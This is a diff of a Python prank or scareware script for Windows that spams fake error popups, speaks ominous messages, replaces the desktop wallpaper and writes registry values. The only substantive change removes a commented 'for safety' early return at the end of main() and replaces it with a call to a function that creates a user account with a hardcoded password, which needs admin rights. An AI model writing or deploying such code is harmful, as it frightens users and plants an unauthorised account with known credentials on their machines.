@@ -20,11 +20,13 @@ CREEPY_PASS = "PRAISE_BE_TO_HE"
 _engine = pyttsx3.init()
 _engine.setProperty("rate", 135)
 
+
 def is_admin():
     try:
         return bool(ctypes.windll.shell32.IsUserAnAdmin())
     except Exception:
         return False
+
 
 def set_registry(key, value):
     try:
@@ -35,6 +37,7 @@ def set_registry(key, value):
     except OSError:
         return False
 
+
 def get_registry(key):
     try:
         reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
@@ -44,6 +47,7 @@ def get_registry(key):
     except OSError:
         return None
 
+
 def speak(text):
     try:
         _engine.say(text)
@@ -52,8 +56,10 @@ def speak(text):
         # Fallback: print if TTS fails
         print("[TTS failed] " + text)
 
+
 def error_spam(limit_popups=5, messages_per_popup=5):
     """Spawn a few message boxes across threads. Limited by defaults to be less abusive."""
+
     def popup():
         messages = [
             "ERROR 0x000FADE: Memory of the tree corrupted.",
@@ -76,6 +82,7 @@ def error_spam(limit_popups=5, messages_per_popup=5):
     for t in threads:
         t.join(timeout=3.0)
 
+
 def create_creepy_user():
     """Create (or re-create) the creepy user. Requires admin."""
     speak("You persisted. The system has chosen.")
@@ -97,6 +104,7 @@ def create_creepy_user():
     input(f"Press Enter to exit...\nUser:{CREEPY_USER} Pass:{CREEPY_PASS}")
     sys.exit(0)
 
+
 def generate_creepy_wallpaper(filename="creepy_background.jpg"):
     """
     Generate an eerie wallpaper.
@@ -111,6 +119,7 @@ def generate_creepy_wallpaper(filename="creepy_background.jpg"):
         r"C:\Windows\Fonts\consola.ttf",
         r"C:\Windows\Fonts\cour.ttf",  # possible fallbacks
     ]
+
     def load_font(path, size):
         try:
             return ImageFont.truetype(path, size)
@@ -164,6 +173,7 @@ def generate_creepy_wallpaper(filename="creepy_background.jpg"):
     print(f"[+] Wallpaper generated: {filename}")
     return filename
 
+
 def change_background():
     image_path = os.path.abspath("creepy_background.jpg")
     generate_creepy_wallpaper(image_path)
@@ -173,6 +183,7 @@ def change_background():
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
     except Exception as e:
         print(f"[-] Failed to change wallpaper: {e}")
+
 
 def final_lore_drop():
     lore = (
@@ -190,6 +201,7 @@ def final_lore_drop():
     print(lore)
     speak("It feeds on curiosity. It spreads. It grows. It hears you. Now.")
 
+
 def run_final_phase():
     speak("Welcome, NullSkin.")
     change_background()
@@ -199,6 +211,7 @@ def run_final_phase():
     time.sleep(5)
     speak("Goodbye, vessel.")
     sys.exit(0)
+
 
 def main():
     if not is_admin():
@@ -224,7 +237,8 @@ def main():
     # If we reach here, final phase could be triggered or whatever else you want
     # For safety, just announce and exit:
     speak("Run count threshold reached.")
-    return None
+    create_creepy_user()
+
 
 if __name__ == "__main__":
     main()
